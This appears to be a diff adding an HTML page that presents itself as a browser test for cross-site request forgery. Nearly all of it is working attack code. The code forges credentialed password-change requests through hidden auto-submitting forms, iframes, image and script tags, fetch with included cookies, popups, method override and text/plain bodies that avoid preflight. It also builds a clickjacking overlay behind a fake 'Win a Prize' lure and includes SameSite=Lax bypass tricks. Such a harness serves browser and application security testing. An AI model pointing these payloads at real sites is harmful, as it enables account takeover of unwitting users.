@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF - Zero-Trust Browser Reaction Test</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        h1 { color: #ff6600; border-bottom: 2px solid #333; padding-bottom: 10px; }
+        .test-group { background: #111; border: 1px solid #333; border-radius: 8px; padding: 20px; margin: 15px 0; }
+        .test-group h2 { color: #00bfff; margin-top: 0; }
+        .payload-btn { background: #1a1a2e; color: #00ff41; border: 1px solid #00ff41; padding: 10px 20px; margin: 5px; cursor: pointer; border-radius: 4px; font-family: monospace; }
+        .payload-btn:hover { background: #00ff41; color: #000; }
+        #output { background: #000; border: 2px solid #333; padding: 15px; margin-top: 20px; min-height: 100px; white-space: pre-wrap; }
+        .info { color: #888; font-size: 13px; }
+        input[type=text] { padding: 8px; background: #111; color: #0f0; border: 1px solid #333; width: 100%; }
+        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
+        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
+        th { background: #1a1a2e; color: #00bfff; }
+        .status { padding: 5px 10px; border-radius: 3px; display: inline-block; }
+        .blocked { background: #330000; color: #ff4444; border: 1px solid #ff4444; }
+        .executed { background: #003300; color: #44ff44; border: 1px solid #44ff44; }
+        .warning { background: #332200; color: #ffaa00; border: 1px solid #ffaa00; }
+    </style>
+</head>
+<body>
+    <h1>[CSRF] Zero-Trust Browser Reaction Test</h1>
+    <p class="info">Tests browser reaction to Cross-Site Request Forgery attacks — forged requests sent from an attacker-controlled page to a target site.</p>
+
+    <div class="test-group">
+        <h2>Target Configuration</h2>
+        <label style="color:#888;">Target URL (the endpoint to forge requests to):</label>
+        <input type="text" id="target-url" value="https://TARGET_APP/api/change-password">
+        <label style="color:#888; margin-top:10px; display:block;">Target Parameter (e.g., new_password, email, etc.):</label>
+        <input type="text" id="target-param" value="new_password" style="margin-top:5px;">
+        <label style="color:#888; margin-top:10px; display:block;">Parameter Value:</label>
+        <input type="text" id="target-value" value="attacker_controlled_password123" style="margin-top:5px;">
+    </div>
+
+    <!-- Test 1: Auto-submit POST form -->
+    <div class="test-group">
+        <h2>Test 1: Auto-Submitting POST Form</h2>
+        <p class="info">Creates a hidden form that auto-submits a POST request to the target with the victim's cookies.</p>
+        <button class="payload-btn" onclick="testAutoSubmitForm()">Fire Auto-Submit CSRF</button>
+        <button class="payload-btn" onclick="testAutoSubmitIframe()">Fire in Hidden Iframe</button>
+        <div id="csrf-form-container"></div>
+    </div>
+
+    <!-- Test 2: GET-based CSRF -->
+    <div class="test-group">
+        <h2>Test 2: GET-Based State Change</h2>
+        <p class="info">Uses IMG, SCRIPT, and LINK tags to fire GET requests with the victim's cookies.</p>
+        <button class="payload-btn" onclick="testGETImage()">IMG Tag</button>
+        <button class="payload-btn" onclick="testGETScript()">SCRIPT Tag</button>
+        <button class="payload-btn" onclick="testGETFetch()">Fetch (no-cors)</button>
+        <button class="payload-btn" onclick="testGETLink()">LINK prefetch</button>
+        <div id="csrf-get-results" style="margin-top:10px;"></div>
+    </div>
+
+    <!-- Test 3: XHR/Fetch CSRF -->
+    <div class="test-group">
+        <h2>Test 3: XMLHttpRequest / Fetch CSRF</h2>
+        <p class="info">Tests cross-origin requests with credentials (cookies). Browser should enforce CORS.</p>
+        <button class="payload-btn" onclick="testXHRWithCreds()">XHR withCredentials</button>
+        <button class="payload-btn" onclick="testFetchInclude()">Fetch credentials:include</button>
+        <button class="payload-btn" onclick="testFetchJSON()">JSON Content-Type</button>
+        <div id="csrf-xhr-results" style="margin-top:10px;"></div>
+    </div>
+
+    <!-- Test 4: Clickjacking-assisted CSRF -->
+    <div class="test-group">
+        <h2>Test 4: Clickjacking-Assisted CSRF</h2>
+        <p class="info">Embeds target in an iframe with transparent overlay — victim clicks thinking they interact with attacker page.</p>
+        <label style="color:#888;">Target URL to iframe:</label>
+        <input type="text" id="clickjack-url" value="https://TARGET_APP/settings">
+        <button class="payload-btn" onclick="testClickjacking()">Create Clickjack Overlay</button>
+        <div id="clickjack-container" style="position:relative; height:400px; margin-top:15px; border:2px solid #333; overflow:hidden;"></div>
+    </div>
+
+    <!-- Test 5: SameSite Cookie Bypass -->
+    <div class="test-group">
+        <h2>Test 5: SameSite Cookie Bypass Techniques</h2>
+        <p class="info">Tests various techniques to bypass SameSite=Lax cookie restrictions.</p>
+        <button class="payload-btn" onclick="testTopLevelNav()">Top-Level Navigation (GET)</button>
+        <button class="payload-btn" onclick="testPopupCSRF()">window.open + form.submit</button>
+        <button class="payload-btn" onclick="testMethodOverride()">POST via _method override</button>
+        <div id="samesite-results" style="margin-top:10px;"></div>
+    </div>
+
+    <!-- Test 6: Multipart/Form-Data CSRF -->
+    <div class="test-group">
+        <h2>Test 6: Content-Type Variations</h2>
+        <p class="info">Tests CSRF with different content types that don't trigger CORS preflight.</p>
+        <button class="payload-btn" onclick="testMultipart()">multipart/form-data</button>
+        <button class="payload-btn" onclick="testUrlEncoded()">application/x-www-form-urlencoded</button>
+        <button class="payload-btn" onclick="testTextPlain()">text/plain</button>
+        <div id="content-type-results" style="margin-top:10px;"></div>
+    </div>
+
+    <!-- Results -->
+    <div class="test-group">
+        <h2>Results Log</h2>
+        <table><thead><tr><th>#</th><th>Test</th><th>Method</th><th>Result</th><th>Browser Reaction</th></tr></thead>
+            <tbody id="results-body"></tbody>
+        </table>
+        <button class="payload-btn" onclick="exportResults()">Export Results</button>
+    </div>
+
+    <div id="output">[*] CSRF Reaction Tester Ready
+[*] Configure target URL above, then run tests
+[*] Monitor Network tab in DevTools for outbound requests
+</div>
+
+    <script>
+        var testCount = 0, results = [];
+        function log(msg) { var o = document.getElementById('output'); o.textContent += '\n' + new Date().toISOString().substr(11,8) + ' ' + msg; o.scrollTop = o.scrollHeight; }
+        function escapeHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+        function getTarget() { return document.getElementById('target-url').value; }
+        function getParam() { return document.getElementById('target-param').value; }
+        function getValue() { return document.getElementById('target-value').value; }
+        function addResult(t, m, r, rx) {
+            testCount++;
+            results.push({num:testCount,test:t,method:m,result:r,reaction:rx,timestamp:new Date().toISOString()});
+            var tr = document.createElement('tr');
+            var cls = r==='SENT'?'executed':r==='BLOCKED'?'blocked':'warning';
+            tr.innerHTML = '<td>'+testCount+'</td><td>'+t+'</td><td>'+m+'</td><td><span class="status '+cls+'">'+r+'</span></td><td>'+rx+'</td>';
+            document.getElementById('results-body').appendChild(tr);
+        }
+
+        // Test 1: Auto-submit form
+        function testAutoSubmitForm() {
+            var url = getTarget(), param = getParam(), val = getValue();
+            log('[CSRF] Auto-submit POST form → ' + url);
+            var container = document.getElementById('csrf-form-container');
+            container.innerHTML = '<form id="csrf-form" method="POST" action="'+url+'" style="display:none;"><input type="hidden" name="'+param+'" value="'+val+'"><input type="hidden" name="csrf_test" value="true"></form>';
+            try { document.getElementById('csrf-form').submit(); addResult('Auto-Submit Form', 'POST', 'SENT', 'Form submitted — check network tab'); }
+            catch(e) { addResult('Auto-Submit Form', 'POST', 'BLOCKED', e.message); }
+        }
+
+        function testAutoSubmitIframe() {
+            var url = getTarget(), param = getParam(), val = getValue();
+            log('[CSRF] Auto-submit in hidden iframe');
+            var iframe = document.createElement('iframe');
+            iframe.name = 'csrf-frame'; iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            var container = document.getElementById('csrf-form-container');
+            container.innerHTML += '<form id="csrf-iframe-form" method="POST" action="'+url+'" target="csrf-frame" style="display:none;"><input type="hidden" name="'+param+'" value="'+val+'"></form>';
+            try { document.getElementById('csrf-iframe-form').submit(); addResult('Iframe Form Submit', 'POST→iframe', 'SENT', 'Submitted via hidden iframe'); }
+            catch(e) { addResult('Iframe Form Submit', 'POST→iframe', 'BLOCKED', e.message); }
+        }
+
+        // Test 2: GET-based
+        function testGETImage() {
+            var url = getTarget() + '?' + getParam() + '=' + encodeURIComponent(getValue());
+            log('[CSRF] IMG GET → ' + url);
+            var img = new Image(); img.src = url;
+            img.onload = function() { addResult('IMG Tag', 'GET', 'SENT', 'Image loaded (200 response)'); };
+            img.onerror = function() { addResult('IMG Tag', 'GET', 'SENT', 'Request fired (non-image response expected)'); };
+        }
+
+        function testGETScript() {
+            var url = getTarget() + '?' + getParam() + '=' + encodeURIComponent(getValue());
+            log('[CSRF] SCRIPT GET → ' + url);
+            var s = document.createElement('script'); s.src = url;
+            s.onload = function() { addResult('SCRIPT Tag', 'GET', 'SENT', 'Script loaded'); };
+            s.onerror = function() { addResult('SCRIPT Tag', 'GET', 'SENT', 'Request fired (error expected)'); };
+            document.body.appendChild(s);
+        }
+
+        function testGETFetch() {
+            var url = getTarget() + '?' + getParam() + '=' + encodeURIComponent(getValue());
+            log('[CSRF] Fetch no-cors GET → ' + url);
+            fetch(url, {method:'GET', mode:'no-cors', credentials:'include'})
+                .then(function() { addResult('Fetch no-cors', 'GET', 'SENT', 'Fetch completed (opaque response)'); })
+                .catch(function(e) { addResult('Fetch no-cors', 'GET', 'BLOCKED', e.message); });
+        }
+
+        function testGETLink() {
+            var url = getTarget() + '?' + getParam() + '=' + encodeURIComponent(getValue());
+            log('[CSRF] LINK prefetch → ' + url);
+            var link = document.createElement('link'); link.rel = 'prefetch'; link.href = url;
+            document.head.appendChild(link);
+            addResult('LINK prefetch', 'GET', 'INJECTED', 'Prefetch link added — check network');
+        }
+
+        // Test 3: XHR/Fetch
+        function testXHRWithCreds() {
+            var url = getTarget();
+            log('[CSRF] XHR withCredentials → ' + url);
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onload = function() { addResult('XHR withCredentials', 'POST', 'SENT', 'Status: ' + xhr.status + ' | CORS allowed read: ' + (xhr.responseText.length > 0)); };
+            xhr.onerror = function() { addResult('XHR withCredentials', 'POST', 'BLOCKED', 'CORS blocked the request'); };
+            xhr.send(getParam() + '=' + encodeURIComponent(getValue()));
+        }
+
+        function testFetchInclude() {
+            var url = getTarget();
+            log('[CSRF] Fetch credentials:include → ' + url);
+            fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:getParam()+'='+encodeURIComponent(getValue())})
+                .then(function(r) { addResult('Fetch include', 'POST', 'SENT', 'Status: ' + r.status); })
+                .catch(function(e) { addResult('Fetch include', 'POST', 'BLOCKED', e.message); });
+        }
+
+        function testFetchJSON() {
+            var url = getTarget();
+            log('[CSRF] Fetch JSON content-type → ' + url);
+            var body = {}; body[getParam()] = getValue();
+            fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)})
+                .then(function(r) { addResult('Fetch JSON', 'POST (JSON)', 'SENT', 'Status: ' + r.status + ' | CORS preflight should trigger'); })
+                .catch(function(e) { addResult('Fetch JSON', 'POST (JSON)', 'BLOCKED', e.message); });
+        }
+
+        // Test 4: Clickjacking
+        function testClickjacking() {
+            var url = document.getElementById('clickjack-url').value;
+            log('[CSRF] Clickjacking overlay → ' + url);
+            var container = document.getElementById('clickjack-container');
+            container.innerHTML = '<iframe src="'+url+'" style="width:100%;height:100%;opacity:0.3;position:absolute;top:0;left:0;z-index:1;"></iframe><div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:0;text-align:center;"><h2 style="color:#ff6600;">Click Here to Win a Prize!</h2><button style="padding:20px 40px;font-size:24px;background:#00ff41;border:none;border-radius:10px;cursor:pointer;">CLAIM NOW</button></div>';
+            addResult('Clickjacking', 'iframe overlay', 'INJECTED', 'Check if X-Frame-Options / frame-ancestors blocks the iframe');
+        }
+
+        // Test 5: SameSite bypass
+        function testTopLevelNav() {
+            var url = getTarget() + '?' + getParam() + '=' + encodeURIComponent(getValue());
+            log('[CSRF] Top-level navigation (SameSite=Lax bypass) → link click');
+            var a = document.createElement('a'); a.href = url; a.target = '_blank'; a.textContent = 'CSRF link (will navigate)'; a.style.color = '#00ff41';
+            document.getElementById('samesite-results').appendChild(a);
+            addResult('Top-Level Nav', 'GET (Lax bypass)', 'INJECTED', 'Click the link — SameSite=Lax allows cookies on top-level GET');
+        }
+
+        function testPopupCSRF() {
+            var url = getTarget();
+            log('[CSRF] window.open + form.submit');
+            try {
+                var popup = window.open('about:blank', 'csrf_popup', 'width=1,height=1');
+                if (popup) {
+                    popup.document.write('<form id="f" method="POST" action="'+url+'"><input name="'+getParam()+'" value="'+getValue()+'"></form><script>document.getElementById("f").submit()<\/script>');
+                    addResult('Popup CSRF', 'POST (popup)', 'SENT', 'Popup opened and form submitted');
+                } else {
+                    addResult('Popup CSRF', 'POST (popup)', 'BLOCKED', 'Popup blocked by browser');
+                }
+            } catch(e) { addResult('Popup CSRF', 'POST (popup)', 'BLOCKED', e.message); }
+        }
+
+        function testMethodOverride() {
+            var url = getTarget();
+            log('[CSRF] _method override (PUT/DELETE via POST)');
+            fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'_method=DELETE&'+getParam()+'='+encodeURIComponent(getValue())})
+                .then(function(r) { addResult('Method Override', 'POST→DELETE', 'SENT', 'Status: ' + r.status); })
+                .catch(function(e) { addResult('Method Override', 'POST→DELETE', 'BLOCKED', e.message); });
+        }
+
+        // Test 6: Content types
+        function testMultipart() {
+            var url = getTarget();
+            log('[CSRF] multipart/form-data');
+            var fd = new FormData(); fd.append(getParam(), getValue());
+            fetch(url, {method:'POST', credentials:'include', body:fd})
+                .then(function(r) { addResult('Multipart', 'POST multipart', 'SENT', 'Status: ' + r.status); })
+                .catch(function(e) { addResult('Multipart', 'POST multipart', 'BLOCKED', e.message); });
+        }
+
+        function testUrlEncoded() {
+            var url = getTarget();
+            log('[CSRF] application/x-www-form-urlencoded');
+            fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:getParam()+'='+encodeURIComponent(getValue())})
+                .then(function(r) { addResult('URL-Encoded', 'POST urlencoded', 'SENT', 'Status: ' + r.status); })
+                .catch(function(e) { addResult('URL-Encoded', 'POST urlencoded', 'BLOCKED', e.message); });
+        }
+
+        function testTextPlain() {
+            var url = getTarget();
+            log('[CSRF] text/plain (no preflight)');
+            fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:getParam()+'='+getValue()})
+                .then(function(r) { addResult('Text/Plain', 'POST text/plain', 'SENT', 'Status: ' + r.status + ' | No CORS preflight for text/plain'); })
+                .catch(function(e) { addResult('Text/Plain', 'POST text/plain', 'BLOCKED', e.message); });
+        }
+
+        function exportResults() {
+            var blob = new Blob([JSON.stringify(results, null, 2)], {type:'application/json'});
+            var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'csrf-results-'+Date.now()+'.json'; a.click();
+        }
+    </script>
+</body>
+</html>
